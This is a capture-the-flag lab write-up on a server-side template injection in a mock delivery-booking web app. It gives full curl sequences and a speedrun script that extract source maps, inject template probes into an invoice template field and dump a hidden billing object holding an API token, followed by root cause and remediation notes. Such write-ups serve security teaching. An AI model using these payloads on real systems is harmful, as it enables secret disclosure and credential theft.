---
title: Galaxy Dash - Template Injection
tags:
  - bugforge
  - template-injection
  - ssti
  - information-disclosure
  - mass-assignment
  - source-maps
aliases:
  - "/BugForge/Galaxy-Dash---Template-Injection"
---
- Galaxy Dash - a Futurama-themed B2B intergalactic delivery booking platform
- Organizations can customise their branding via an invoice template string
- The template is rendered server-side against a context that includes a hidden `billing` object
- Referencing the whole object (`{{billing}}`) serialises it into the invoice and leaks a secret `api_token`

## Enumeration

Set the target:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
```

### Endpoint Extraction + Source Maps

```bash
# Grab the main JS bundle filename
curl -sk "$TARGET" | grep -o 'static/js/main\.[a-f0-9]*\.js'
# main.6e0c19b4.js

# Check for source map directive
curl -sk "$TARGET/static/js/main.6e0c19b4.js" | tail -1
# //# sourceMappingURL=main.6e0c19b4.js.map

# Download source map and extract original source files
curl -sk "$TARGET/static/js/main.6e0c19b4.js.map" | python3 -c "
import json, sys, os
m = json.load(sys.stdin)
for i, name in enumerate(m.get('sources',[])):
    if 'node_modules' not in name:
        path = '/tmp/sm/' + name.split('/')[-1]
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, 'w').write(m['sourcesContent'][i])
        print(f'  [+] {name}')
"
```

Results:
- 18 API endpoints
- 11 React components extracted
- Express backend, CORS `*`, HS256 JWT with `id, username, organizationId, iat` (no expiry)

### Key Endpoints

| Method | Path | Notes |
|--------|------|-------|
| POST | /api/register | Creates user + org, returns JWT |
| POST | /api/login | Returns JWT |
| GET | /api/verify-token | Token validation |
| GET | /api/organization | Org details (LEAKS hidden field) |
| PUT | /api/organization | Update org (VULNERABLE - branding) |
| POST | /api/calculate-price | Price calculator |
| POST | /api/bookings | Create booking |
| GET | /api/bookings/:id | Get booking |
| GET | /api/invoices/:id | Invoice (renders branding) |
| GET | /api/locations | All delivery locations |
| GET | /api/services | Delivery service tiers |
| GET/POST | /api/team | Team management |

### The Branding Hint

The `OrganizationSettings.js` component only exposes name, business type, HQ and contact fields - nothing template-like:

```js
// components/OrganizationSettings.js
const [formData, setFormData] = useState({
  name: '', business_type: '', headquarters_planet: '',
  headquarters_address: '', contact_email: '', contact_phone: ''
});
await axios.put('/api/organization', formData);
```

But the UI form is not the full picture. Reading what the API actually *returns* for an organization reveals an extra field the frontend never displays:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/organization"
```

```json
{
  "id": 4,
  "name": "PHT Corp",
  "business_type": "General",
  "status": "active",
  "invoice_template": "Thank you for choosing Galaxy Dash! Invoice {{ invoice.number }} for {{ organization.name }} -- billing account {{ billing.account_id }}. Total due: {{ invoice.total }} credits.",
  "created_at": "2026-06-16 08:19:28"
}
```

`invoice_template` is the branding. It uses `{{ ... }}` placeholders and references three context objects - `invoice`, `organization`, and `billing`. The `billing` object is interesting: it is referenced by the template but never returned by any normal endpoint.

## Exploitation

### Step 1 - Register (you become org_admin)

Each registration creates a new organization and makes you its admin with `can_manage_org`:

```bash
TOKEN=$(curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"pwn","email":"pwn@test.com","password":"Pass123!","full_name":"pwn","org_name":"PwnOrg","business_type":"General","headquarters_planet":"Earth"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

```json
{
  "user": {
    "id": 5, "username": "pwn", "role": "org_admin", "organizationId": 4,
    "permissions": { "can_manage_org": true, "can_manage_team": true, ... }
  }
}
```

`can_manage_org: true` means we can `PUT /api/organization` - including the hidden `invoice_template`.

### Step 2 - Inject a Probe into the Template

Overwrite the branding with a template-injection probe to fingerprint the engine:

```bash
curl -sk -X PUT "$TARGET/api/organization" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"PwnOrg","invoice_template":"A={{ 7*7 }} B=${7*7} C=<%= 7*7 %> D=#{7*7} E={{organization.name}}"}'
```

```json
{"message":"Organization updated successfully"}
```

### Step 3 - Trigger the Render via an Invoice

The template only renders when an invoice is generated. Create a booking (an invoice is auto-generated for it). First get the price, then book:

```bash
# Calculate price (returns total, risk, delivery time the booking endpoint requires)
curl -sk -X POST "$TARGET/api/calculate-price" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"service_id":3,"origin_location_id":12,"destination_location_id":14,"cargo_size":"small","cargo_weight_kg":10,"danger_level":1,"has_insurance":false,"has_premium_tracking":false}'
# {"total":1730.75,"risk":95,"estimatedDeliveryMinutes":1440}

# Create the booking (echo the calculated values back)
curl -sk -X POST "$TARGET/api/bookings" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"service_id":3,"origin_location_id":12,"destination_location_id":14,"cargo_description":"x","cargo_size":"small","cargo_weight_kg":10,"danger_level":1,"has_insurance":false,"has_premium_tracking":false,"total_price":1730.75,"calculated_risk_percent":95,"estimated_delivery_minutes":1440}'
# {"id":1,"message":"Booking created successfully"}
```

Now fetch the invoice and read the rendered `branding` field:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/1"
```

```json
{
  "invoice_number": "GD-2026-000001",
  "branding": "A= B=${7*7} C=<%= 7*7 %> D=#{7*7} E=PwnOrg",
  ...
}
```

Fingerprint result:
- `{{ 7*7 }}` -> **empty** (not `49`) - no arithmetic, so no classic RCE
- `${...}`, `<%= %>`, `#{...}` -> left **literal** - not template literals / EJS / Pug
- `{{organization.name}}` -> `PwnOrg` - resolved

This is a **logic-less template engine** (Handlebars/Mustache-style): it does dot-path variable lookups against the context, nothing more. The win here is not RCE - it is reaching a sensitive object that lives in the render context.

> Note: `branding` re-renders on every `GET /api/invoices/:id`, so you can iterate template payloads freely without creating new bookings.

### Step 4 - Dump the Hidden `billing` Object

The original template referenced `{{ billing.account_id }}`, so `billing` is in scope. Instead of guessing individual field names, reference the **whole object** - a logic-less engine will serialise it:

```bash
curl -sk -X PUT "$TARGET/api/organization" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"PwnOrg","invoice_template":"BILL=[{{billing}}]"}'

curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/1"
```

```json
{
  "branding": "BILL=[{\"account_id\":\"GD-ACCT-000004\",\"currency\":\"credits\",\"api_token\":\"bug{56Aa6kpgWCgKE2yXKNUqDs64GkZj1dTY}\"}]",
  ...
}
```

The `billing` object carries a secret `api_token` - never exposed by any normal endpoint - and that token is the flag.

```
bug{56Aa6kpgWCgKE2yXKNUqDs64GkZj1dTY}
```

## TL;DR - Speedrun

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"

# 1. Register (you become org_admin with can_manage_org)
TOKEN=$(curl -sk -X POST "$TARGET/api/register" -H "Content-Type: application/json" \
  -d '{"username":"pwn","email":"pwn@x.com","password":"Pass123!","full_name":"x","org_name":"x","business_type":"General","headquarters_planet":"Earth"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Set branding template to dump the whole billing object
curl -sk -X PUT "$TARGET/api/organization" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"x","invoice_template":"FLAG=[{{billing}}]"}'

# 3. Generate an invoice (calc price -> book), then read the rendered branding
P=$(curl -sk -X POST "$TARGET/api/calculate-price" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"service_id":3,"origin_location_id":12,"destination_location_id":14,"cargo_size":"small","cargo_weight_kg":10,"danger_level":1,"has_insurance":false,"has_premium_tracking":false}')
curl -sk -X POST "$TARGET/api/bookings" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "$(echo $P | python3 -c 'import sys,json;d=json.load(sys.stdin);print(json.dumps({"service_id":3,"origin_location_id":12,"destination_location_id":14,"cargo_description":"x","cargo_size":"small","cargo_weight_kg":10,"danger_level":1,"has_insurance":False,"has_premium_tracking":False,"total_price":d["total"],"calculated_risk_percent":d["risk"],"estimated_delivery_minutes":d["estimatedDeliveryMinutes"]}))')"

# 4. Flag is in the branding field
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/1" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['branding'])"
```

## Why This Works

The branding feature renders a user-controlled template server-side against a context object that the developer over-populated:

```js
// Conceptual server logic for invoice generation
const context = {
  invoice: { number, total, ... },
  organization: { name, address, tax_id },
  billing: { account_id, currency, api_token }   // <-- secret in render scope
};
const branding = render(org.invoice_template, context);  // user controls the template
```

Two mistakes compound:

1. **User-controlled template** - `invoice_template` is writable via `PUT /api/organization` and rendered as a template, not treated as inert data.
2. **Secret in the render context** - the `billing` object (with `api_token`) is placed in the same context as display fields. A logic-less engine still lets you reference and serialise the entire object by name (`{{billing}}`), so the secret leaks even without code execution.

The engine being logic-less is what makes this "information disclosure" rather than RCE - but the impact (a leaked API token) is still high. The trap for a tester is spending time on `{{7*7}}` / `${}` / `<%= %>` arithmetic payloads chasing RCE, when the actual primitive is "name a sensitive object that is already in scope."

## Security Takeaways

### Vulnerabilities

1. **Template injection** on `/api/organization` `invoice_template` - user-controlled template rendered server-side
2. **Sensitive data in render context** - the `billing.api_token` secret is reachable from the template
3. **Hidden field exposure** - `invoice_template` is returned by `GET /api/organization` but never shown in the UI, revealing the attack surface

### Impact

- Disclosure of a per-org secret `api_token` that grants programmatic access
- Any org admin can leak their own org's secrets; in a real deployment this is a credential-theft / privilege-escalation primitive
- Logic-less engine = no RCE here, but a richer engine (EJS/Pug/Nunjucks) in the same design would mean full server compromise

### Root Cause

- Treating user input as a template instead of data
- Building the render context from a broad internal object graph rather than an explicit allowlist of display-safe scalars
- Returning internal fields (`invoice_template`) in API responses without considering them as attack surface

### Remediation

- Do not render user-controlled strings as templates. If branding customisation is required, support a fixed set of named placeholders (`{{invoice_number}}`, `{{total}}`) and reject anything else.
- Build the render context from an explicit allowlist of display-intended **scalar** fields - never pass whole objects like `billing` into a template scope.
- Keep secrets (`api_token`, keys) out of any object that touches a rendering or serialisation path.
- If a template engine must be used, choose a sandboxed one and disable object/property traversal.
